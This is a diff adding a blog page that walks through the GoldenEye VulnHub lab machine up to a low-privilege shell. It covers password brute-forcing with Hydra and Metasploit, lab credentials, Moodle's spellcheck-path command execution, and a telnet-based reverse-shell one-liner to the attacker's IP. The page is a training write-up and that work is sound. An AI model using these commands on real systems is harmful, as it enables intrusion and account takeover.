@@ -1,0 +1,906 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>GoldenEye 007 - Core dump overflow</title>
+  <meta name="author" content="chousensha">
+
+  
+  
+  <meta name="description" content="GoldenEye writeup">
+  <meta name="keywords" content="goldeneye, pentest lab, vulnhub, ctf, boot2root, moodle">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://chousensha.github.io/blog/2019/04/02/goldeneye-007">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="Core dump overflow" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+  <script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', 'UA-51216602-2']);
+    _gaq.push(['_trackPageview']);
+
+    (function() {
+      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+  </script>
+
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">Core dump overflow</a></h1>
+  
+    <h2>Core dump in progress...</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:chousensha.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/where-to-start">Where to start</a></li>
+  <li><a href="/book-corner">Book corner</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">GoldenEye 007</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2019-04-02T21:57:39+03:00" pubdate data-updated="true">Apr 2<span>nd</span>, 2019</time>
+        
+           | <a href="#disqus_thread"
+             data-disqus-identifier="http://chousensha.github.io">Comments</a>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>Today&rsquo;s VM is inspired by a James Bond movie:</p>
+
+<blockquote><p>I recently got done creating an OSCP type vulnerable machine that&rsquo;s themed after the great James Bond film (and even better n64 game) GoldenEye.
+The goal is to get root and capture the secret GoldenEye codes &ndash; flag.txt.</p>
+
+<p>I&rsquo;d rate it as Intermediate, it has a good variety of techniques needed to get root &ndash; no exploit development/buffer overflows. After completing
+the OSCP I think this would be a great one to practice on, plus there&rsquo;s a hint of CTF flavor.</p></blockquote>
+
+<!-- more -->
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>PORT      STATE SERVICE     VERSION
+</span><span class='line'>25/tcp    open  smtp        Postfix smtpd
+</span><span class='line'>|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN,
+</span><span class='line'>|_ssl-date: TLS randomness does not represent time
+</span><span class='line'>80/tcp    open  http        Apache httpd 2.4.7 ((Ubuntu))
+</span><span class='line'>|_http-server-header: Apache/2.4.7 (Ubuntu)
+</span><span class='line'>|_http-title: GoldenEye Primary Admin Server
+</span><span class='line'>55006/tcp open  ssl/unknown
+</span><span class='line'>|_ssl-date: TLS randomness does not represent time
+</span><span class='line'>55007/tcp open  pop3        Dovecot pop3d
+</span><span class='line'>|_pop3-capabilities: SASL(PLAIN) USER AUTH-RESP-CODE CAPA STLS UIDL PIPELINING RESP-CODES TOP
+</span><span class='line'>|_ssl-date: TLS randomness does not represent time</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Navigating to the web server takes you to this screen:</p>
+
+<p><img class="center" src="/images/pentest/goldeneye/web.png" title="goldeneye web" alt="goldeneye web"></p>
+
+<p>In the source code of the page there&rsquo;s a linked <em>terminal.js</em> file. Viewing that reveals some interesting comments:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class='html'><span class='line'>//
+</span><span class='line'>//Boris, make sure you update your default password.
+</span><span class='line'>//My sources say MI6 maybe planning to infiltrate.
+</span><span class='line'>//Be on the lookout for any suspicious network traffic....
+</span><span class='line'>//
+</span><span class='line'>//I encoded you p@ssword below...
+</span><span class='line'>//
+</span><span class='line'>//<span class="ni">&amp;#73;&amp;#110;&amp;#118;&amp;#105;&amp;#110;&amp;#99;&amp;#105;&amp;#98;&amp;#108;&amp;#101;&amp;#72;&amp;#97;&amp;#99;&amp;#107;&amp;#51;&amp;#114;</span>
+</span><span class='line'>//
+</span><span class='line'>//BTW Natalya says she can break your codes
+</span><span class='line'>//
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>So we have a HTML encoded password which decodes to <code>InvincibleHack3r</code>. Now we can go to <em>/sev-home</em> and log in as boris with this password.</p>
+
+<p><img class="center" src="/images/pentest/goldeneye/goldeneye.png" title="goldeneye login" alt="goldeneye login"></p>
+
+<p>We can now make use of that POP3 service on port 55007. Boris&#8217; credentials didn&rsquo;t work though. I used Nikto to further look at the web server and got an interesting hit:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='html'><span class='line'>+ /splashAdmin.php: Cobalt Qube 3 admin is running. This may have multiple security problems as described by www.scan-associates.net. These could not be tested remotely.
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Going to that page wasn&rsquo;t immediately useful though, but maybe some of the information could be used further:</p>
+
+<p><img class="center" src="/images/pentest/goldeneye/splashadmin.png" title="splashadmin" alt="splashadmin"></p>
+
+<p>With nothing else to go from, I attempted to bruteforce the mail login credentials for boris with the Metasploit <em>scanner/pop3/pop3_login</em> module and the <em>fasttrack.txt</em> wordlist:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='html'><span class='line'>[+] 192.168.159.130:55007 - 192.168.159.130:55007 - Success: &#39;boris:secret1!&#39; &#39;+OK Logged in.  &#39;
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>So now we have credentials for Boris&#8217; mail and I was able to read his mails:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+</pre></td><td class='code'><pre><code class='html'><span class='line'>nc 192.168.159.130 55007
+</span><span class='line'>+OK GoldenEye POP3 Electronic-Mail System
+</span><span class='line'>USER boris
+</span><span class='line'>+OK
+</span><span class='line'>PASS secret1!
+</span><span class='line'>+OK Logged in.
+</span><span class='line'>LIST
+</span><span class='line'>+OK 3 messages:
+</span><span class='line'>1 544
+</span><span class='line'>2 373
+</span><span class='line'>3 921
+</span><span class='line'>.
+</span><span class='line'>RETR 1
+</span><span class='line'>+OK 544 octets
+</span><span class='line'>Return-Path: <span class="nt">&lt;root</span><span class="err">@</span><span class="na">127</span><span class="err">.</span><span class="na">0</span><span class="err">.</span><span class="na">0</span><span class="err">.</span><span class="na">1</span><span class="err">.</span><span class="na">goldeneye</span><span class="nt">&gt;</span>
+</span><span class='line'>X-Original-To: boris
+</span><span class='line'>Delivered-To: boris@ubuntu
+</span><span class='line'>Received: from ok (localhost [127.0.0.1])
+</span><span class='line'>  by ubuntu (Postfix) with SMTP id D9E47454B1
+</span><span class='line'>  for <span class="nt">&lt;boris&gt;</span>; Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
+</span><span class='line'>Message-Id: <span class="nt">&lt;20180425022326</span><span class="err">.</span><span class="na">D9E47454B1</span><span class="err">@</span><span class="na">ubuntu</span><span class="nt">&gt;</span>
+</span><span class='line'>Date: Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
+</span><span class='line'>From: root@127.0.0.1.goldeneye
+</span><span class='line'>
+</span><span class='line'>Boris, this is admin. You can electronically communicate to co-workers and students here. I&#39;m not going to scan emails for security risks because I trust you and the other admins here.
+</span><span class='line'>.
+</span><span class='line'>RETR 2
+</span><span class='line'>+OK 373 octets
+</span><span class='line'>Return-Path: <span class="nt">&lt;natalya</span><span class="err">@</span><span class="na">ubuntu</span><span class="nt">&gt;</span>
+</span><span class='line'>X-Original-To: boris
+</span><span class='line'>Delivered-To: boris@ubuntu
+</span><span class='line'>Received: from ok (localhost [127.0.0.1])
+</span><span class='line'>  by ubuntu (Postfix) with ESMTP id C3F2B454B1
+</span><span class='line'>  for <span class="nt">&lt;boris&gt;</span>; Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
+</span><span class='line'>Message-Id: <span class="nt">&lt;20180425024249</span><span class="err">.</span><span class="na">C3F2B454B1</span><span class="err">@</span><span class="na">ubuntu</span><span class="nt">&gt;</span>
+</span><span class='line'>Date: Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
+</span><span class='line'>From: natalya@ubuntu
+</span><span class='line'>
+</span><span class='line'>Boris, I can break your codes!
+</span><span class='line'>.
+</span><span class='line'>RETR 3
+</span><span class='line'>+OK 921 octets
+</span><span class='line'>Return-Path: <span class="nt">&lt;alec</span><span class="err">@</span><span class="na">janus</span><span class="err">.</span><span class="na">boss</span><span class="nt">&gt;</span>
+</span><span class='line'>X-Original-To: boris
+</span><span class='line'>Delivered-To: boris@ubuntu
+</span><span class='line'>Received: from janus (localhost [127.0.0.1])
+</span><span class='line'>  by ubuntu (Postfix) with ESMTP id 4B9F4454B1
+</span><span class='line'>  for <span class="nt">&lt;boris&gt;</span>; Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
+</span><span class='line'>Message-Id: <span class="nt">&lt;20180425025235</span><span class="err">.</span><span class="na">4B9F4454B1</span><span class="err">@</span><span class="na">ubuntu</span><span class="nt">&gt;</span>
+</span><span class='line'>Date: Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
+</span><span class='line'>From: alec@janus.boss
+</span><span class='line'>
+</span><span class='line'>Boris,
+</span><span class='line'>
+</span><span class='line'>Your cooperation with our syndicate will pay off big. Attached are the final access codes for GoldenEye. Place them in a hidden file within the root directory of this server then remove from this email. There can only be one set of these acces codes, and we need to secure them for the final execution. If they are retrieved and captured our plan will crash and burn!
+</span><span class='line'>
+</span><span class='line'>Once Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal codes we will push to our final stages....
+</span><span class='line'>
+</span><span class='line'>PS - Keep security tight or we will be compromised.
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We now know to look for access codes once we get a shell on the target. We also learned there&rsquo;s another username on the ubuntu domain: natalya. So I kicked off the bruteforce for her account as well, this time with Hydra, because I wasn&rsquo;t happy with the speed of the Metasploit module.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='html'><span class='line'>hydra -l natalya -P /usr/share/wordlists/fasttrack.txt 192.168.159.130 -s 55007 pop3 -f
+</span><span class='line'>[55007][pop3] host: 192.168.159.130   login: natalya   password: bird
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Got lucky with natalya as well. Now back to reading emails:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+</pre></td><td class='code'><pre><code class='html'><span class='line'>nc 192.168.159.130 55007
+</span><span class='line'>+OK GoldenEye POP3 Electronic-Mail System
+</span><span class='line'>USER natalya
+</span><span class='line'>+OK
+</span><span class='line'>PASS bird
+</span><span class='line'>+OK Logged in.
+</span><span class='line'>LIST
+</span><span class='line'>+OK 2 messages:
+</span><span class='line'>1 631
+</span><span class='line'>2 1048
+</span><span class='line'>.
+</span><span class='line'>RETR 1
+</span><span class='line'>+OK 631 octets
+</span><span class='line'>Return-Path: <span class="nt">&lt;root</span><span class="err">@</span><span class="na">ubuntu</span><span class="nt">&gt;</span>
+</span><span class='line'>X-Original-To: natalya
+</span><span class='line'>Delivered-To: natalya@ubuntu
+</span><span class='line'>Received: from ok (localhost [127.0.0.1])
+</span><span class='line'>  by ubuntu (Postfix) with ESMTP id D5EDA454B1
+</span><span class='line'>  for <span class="nt">&lt;natalya&gt;</span>; Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
+</span><span class='line'>Message-Id: <span class="nt">&lt;20180425024542</span><span class="err">.</span><span class="na">D5EDA454B1</span><span class="err">@</span><span class="na">ubuntu</span><span class="nt">&gt;</span>
+</span><span class='line'>Date: Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
+</span><span class='line'>From: root@ubuntu
+</span><span class='line'>
+</span><span class='line'>Natalya, please you need to stop breaking boris&#39; codes. Also, you are GNO supervisor for training. I will email you once a student is designated to you.
+</span><span class='line'>
+</span><span class='line'>Also, be cautious of possible network breaches. We have intel that GoldenEye is being sought after by a crime syndicate named Janus.
+</span><span class='line'>.
+</span><span class='line'>RETR 2
+</span><span class='line'>+OK 1048 octets
+</span><span class='line'>Return-Path: <span class="nt">&lt;root</span><span class="err">@</span><span class="na">ubuntu</span><span class="nt">&gt;</span>
+</span><span class='line'>X-Original-To: natalya
+</span><span class='line'>Delivered-To: natalya@ubuntu
+</span><span class='line'>Received: from root (localhost [127.0.0.1])
+</span><span class='line'>  by ubuntu (Postfix) with SMTP id 17C96454B1
+</span><span class='line'>  for <span class="nt">&lt;natalya&gt;</span>; Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
+</span><span class='line'>Message-Id: <span class="nt">&lt;20180425031956</span><span class="err">.</span><span class="na">17C96454B1</span><span class="err">@</span><span class="na">ubuntu</span><span class="nt">&gt;</span>
+</span><span class='line'>Date: Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
+</span><span class='line'>From: root@ubuntu
+</span><span class='line'>
+</span><span class='line'>Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it&#39;s related to security...even if it&#39;s not, just enter it in under the guise of &quot;security&quot;...it&#39;ll get the change order escalated without much hassle :)
+</span><span class='line'>
+</span><span class='line'>Ok, user creds are:
+</span><span class='line'>
+</span><span class='line'>username: xenia
+</span><span class='line'>password: RCP90rulez!
+</span><span class='line'>
+</span><span class='line'>Boris verified her as a valid contractor so just create the account ok?
+</span><span class='line'>
+</span><span class='line'>And if you didn&#39;t have the URL on outr internal Domain: severnaya-station.com/gnocertdir
+</span><span class='line'>**Make sure to edit your host file since you usually work remote off-network....
+</span><span class='line'>
+</span><span class='line'>Since you&#39;re a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now we&rsquo;ve learned some interesting things..it seems Boris is a double agent! We now have a new set of credentials: <code>xenia:RCP90rulez!</code> and the internal domain for which we have to add an entry in our hosts file. With that done, going to the URL took me to a training portal:</p>
+
+<p><img class="center" src="/images/pentest/goldeneye/moodle.png" title="moodle" alt="moodle"></p>
+
+<p>We can log in as Xenia and find a message on the platform:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class='html'><span class='line'>Tuesday, 24 April 2018
+</span><span class='line'>09:24 PM: Greetings Xenia,
+</span><span class='line'>
+</span><span class='line'>As a new Contractor to our GoldenEye training I welcome you. Once your account has been complete, more courses will appear on your dashboard. If you have any questions message me via email, not here.
+</span><span class='line'>
+</span><span class='line'>My email username is...
+</span><span class='line'>
+</span><span class='line'>doak
+</span><span class='line'>
+</span><span class='line'>Thank you,
+</span><span class='line'>
+</span><span class='line'>Cheers,
+</span><span class='line'>
+</span><span class='line'>Dr. Doak &quot;The Doctor&quot;
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We have a new mail username and by now we know what&rsquo;s coming..</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='html'><span class='line'>[55007][pop3] host: 192.168.159.130   login: doak   password: goat
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>There&rsquo;s only one mail, but it contains portal credentials:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+</pre></td><td class='code'><pre><code class='html'><span class='line'>Return-Path: <span class="nt">&lt;doak</span><span class="err">@</span><span class="na">ubuntu</span><span class="nt">&gt;</span>
+</span><span class='line'>X-Original-To: doak
+</span><span class='line'>Delivered-To: doak@ubuntu
+</span><span class='line'>Received: from doak (localhost [127.0.0.1])
+</span><span class='line'>  by ubuntu (Postfix) with SMTP id 97DC24549D
+</span><span class='line'>  for <span class="nt">&lt;doak&gt;</span>; Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
+</span><span class='line'>Message-Id: <span class="nt">&lt;20180425034731</span><span class="err">.</span><span class="na">97DC24549D</span><span class="err">@</span><span class="na">ubuntu</span><span class="nt">&gt;</span>
+</span><span class='line'>Date: Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
+</span><span class='line'>From: doak@ubuntu
+</span><span class='line'>
+</span><span class='line'>James,
+</span><span class='line'>If you&#39;re reading this, congrats you&#39;ve gotten this far. You know how tradecraft works right?
+</span><span class='line'>
+</span><span class='line'>Because I don&#39;t. Go to our training site and login to my account....dig until you can exfiltrate further information......
+</span><span class='line'>
+</span><span class='line'>username: dr_doak
+</span><span class='line'>password: 4England!
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Look around until you find a secret file inside My private files:</p>
+
+<p><img class="center" src="/images/pentest/goldeneye/secret.png" title="secret" alt="secret"></p>
+
+<p>The contents are:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class='html'><span class='line'>007,
+</span><span class='line'>
+</span><span class='line'>I was able to capture this apps adm1n cr3ds through clear txt.
+</span><span class='line'>
+</span><span class='line'>Text throughout most web apps within the GoldenEye servers are scanned, so I cannot add the cr3dentials here.
+</span><span class='line'>
+</span><span class='line'>Something juicy is located here: /dir007key/for-007.jpg
+</span><span class='line'>
+</span><span class='line'>Also as you may know, the RCP-90 is vastly superior to any other weapon and License to Kill is the only way to play.
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The image most likely has hidden data within:</p>
+
+<p><img class="center" src="/images/pentest/goldeneye/for-007.jpg" title="message for 007" alt="message for 007"></p>
+
+<p>Running strings on the image reveals a base64 string: <em>eFdpbnRlcjE5OTV4IQ==</em>, which is decoded to <code>xWinter1995x!</code>. Now we can log in as admin to the platform. After some more recon, it seems that we can achieve RCE with a Metasploit exploit for Moodle:</p>
+
+<blockquote><p>Moodle allows an authenticated user to define spellcheck settings via the web interface. The user can update the spellcheck mechanism to point
+to a system-installed aspell binary. By updating the path for the spellchecker to an arbitrary command, an attacker can run arbitrary commands
+in the context of the web application upon spellchecking requests. This module also allows an attacker to leverage another privilege escalation
+vuln. Using the referenced XSS vuln, an unprivileged authenticated user can steal an admin sesskey and use this to escalate privileges to that
+of an admin, allowing the module to pop a shell as a previously unprivileged authenticated user. This module was tested against Moodle version
+2.5.2 and 2.2.3.</p></blockquote>
+
+<p>The admin account we hijacked has the necessary privileges, so we can use this exploit.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class='html'><span class='line'>Module options (exploit/multi/http/moodle_cmd_exec):
+</span><span class='line'>
+</span><span class='line'>   Name       Current Setting        Required  Description
+</span><span class='line'>   ----       ---------------        --------  -----------
+</span><span class='line'>   PASSWORD   xWinter1995x!          yes       Password to authenticate with
+</span><span class='line'>   Proxies                           no        A proxy chain of format type:host:port[,type:host:port][...]
+</span><span class='line'>   RHOSTS     severnaya-station.com  yes       The target address range or CIDR identifier
+</span><span class='line'>   RPORT      80                     yes       The target port (TCP)
+</span><span class='line'>   SESSKEY                           no        The session key of the user to impersonate
+</span><span class='line'>   SSL        false                  no        Negotiate SSL/TLS for outgoing connections
+</span><span class='line'>   TARGETURI  /gnocertdir            yes       The URI of the Moodle installation
+</span><span class='line'>   USERNAME   admin                  yes       Username to authenticate with
+</span><span class='line'>   VHOST                             no        HTTP server virtual host
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>It seemed straightforward, but the exploit failed to run for me. I looked over the source code and saw that the spellcheck engine that is set by the exploit is PSpellShell. By default on the site, the TinyMCE HTML editor spell engine selected was Google Spell. So I manually changed this and ran the exploit again, but it still didn&rsquo;t work. So I did it manually. Recall this part:</p>
+
+<blockquote><p>By updating the path for the spellchecker to an arbitrary command, an attacker can run arbitrary commands in the context of the web application
+upon spellchecking requests</p></blockquote>
+
+<p>Under Server &ndash;> System paths, I edited the <strong>Path to aspell</strong> field with this reverse shell one-liner (had to cycle through a couple before finding one that worked): <code>sh -c &lsquo;(mknod /tmp/backpipe p 2> /dev/null &amp;&amp; /bin/bash 0</tmp/backpipe | telnet 192.168.159.129 8080 1>/tmp/backpipe &amp;)&rsquo;</code></p>
+
+<p>Now if you go to Blogs and add a new entry, you can invoke the spellchecker by clicking on the spellcheck button:</p>
+
+<p><img class="center" src="/images/pentest/goldeneye/spellcheck.png" title="spellcheck" alt="spellcheck"></p>
+
+<p>And you should receive a shell on your listener. I upgraded it to a proper one:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class='html'><span class='line'>nc -vnlp 8080
+</span><span class='line'>listening on [any] 8080 ...
+</span><span class='line'>connect to [192.168.159.129] from (UNKNOWN) [192.168.159.130] 54586
+</span><span class='line'>whoami
+</span><span class='line'>www-data
+</span><span class='line'>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;
+</span><span class='line'><span class="nt">&lt;ditor</span><span class="err">/</span><span class="na">tinymce</span><span class="err">/</span><span class="na">tiny_mce</span><span class="err">/</span><span class="na">3</span><span class="err">.</span><span class="na">4</span><span class="err">.</span><span class="na">9</span><span class="err">/</span><span class="na">plugins</span><span class="err">/</span><span class="na">spellchecker</span><span class="err">$</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The kernel version is really old:</p>
+
